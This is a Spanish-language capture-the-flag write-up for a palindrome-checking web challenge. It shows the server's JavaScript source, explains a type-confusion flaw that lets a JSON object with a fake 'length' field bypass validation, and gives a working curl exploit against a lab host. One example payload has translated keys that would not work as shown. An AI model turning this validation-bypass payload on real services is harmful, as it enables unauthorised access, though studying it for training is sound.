# Magical Palindrome

## Descripción
En este desafío, se nos presenta una aplicación web que verifica si una cadena ingresada es un palíndromo. Un palíndromo es una palabra, frase, número u otra secuencia de caracteres que se lee igual hacia adelante y hacia atrás (ignorando espacios, puntuación y mayúsculas/minúsculas).
El objetivo es encontrar una vulnerabilidad en la lógica de verificación de palíndromos que nos permita saltarnos la validación.

## Analizamos el codigo fuente
Al inspeccionar el código fuente de la aplicación, encontramos la función responsable de verificar si una cadena es un palíndromo. 

```js
import {serve} from '@hono/node-server';
import {serveStatic} from '@hono/node-server/serve-static';
import {Hono} from 'hono';
import {readFileSync} from 'fs';

const flag = readFileSync('/flag.txt', 'utf8').trim();

const IsPalinDrome = (string) => {
	if (string.length < 1000) {
		return 'Tootus Shortus';
	}

	for (const i of Array(string.length).keys()) {
		const original = string[i];
		const reverse = string[string.length - i - 1];

		if (original !== reverse || typeof original !== 'string') {
			return 'Notter Palindromer!!';
		}
	}

	return null;
}

const app = new Hono();

app.get('/', serveStatic({root: '.'}));

app.post('/', async (c) => {
	const {palindrome} = await c.req.json();
	const error = IsPalinDrome(palindrome);
	if (error) {
		c.status(400);
		return c.text(error);
	}
	return c.text(`Hii Harry!!! ${flag}`);
});

app.port = 3000;

serve(app);
```
La función `IsPalinDrome` primero verifica si la longitud de la cadena es menor a 1000 caracteres. Si es así, devuelve un mensaje indicando que la cadena es demasiado corta. Luego, itera sobre cada carácter de la cadena, comparando el carácter en la posición `i` con el carácter en la posición opuesta `string.length - i - 1`. Si encuentra una discrepancia, devuelve un mensaje indicando que no es un palíndromo. Si todos los caracteres coinciden, devuelve `null`, indicando que la cadena es un palíndromo válido.

Dos observaciones importantes:

- El servidor realiza comprobaciones string.length < 1000.
- Se repite el bucle Array(string.length).keys().

## Comportamiento de arrays en javascript

```
Array (1000) // Crea un array con 1000 posiciones vacías
Array ("1000") // crea ["1000"] -> itera Solo una vez
```
El truco del CTF: “fingir” un array de 1000 elementos sin enviarlo

JavaScript es muy flexible:
puedes crear un objeto que aparenta ser un array enorme sin realmente contener esos datos.

## Explotación
Para explotar esta vulnerabilidad, podemos enviar un objeto JSON que simule ser un array de 1000 caracteres, pero en realidad solo contenga los caracteres necesarios para pasar la verificación.

```xml
{ "palíndromo" : { "longitud" : "1000" , "0" : "a" , "999" : "a" } }
```

Si usamos curl:
```shell
 curl -X POST http://94.237.48.51:42931/ \ 
  -H "Content-Type: application/json" \
  -d '{"palindrome":{"length":"1000","0":"x","999":"x"}}'

```

Este:

- Pasa la length >= 1000prueba
- Hace que el bucle se ejecute solo una vez.
- Asegura que los caracteres coincidan
- Cabe en menos de 75 bytes

El servidor devuelve la flag.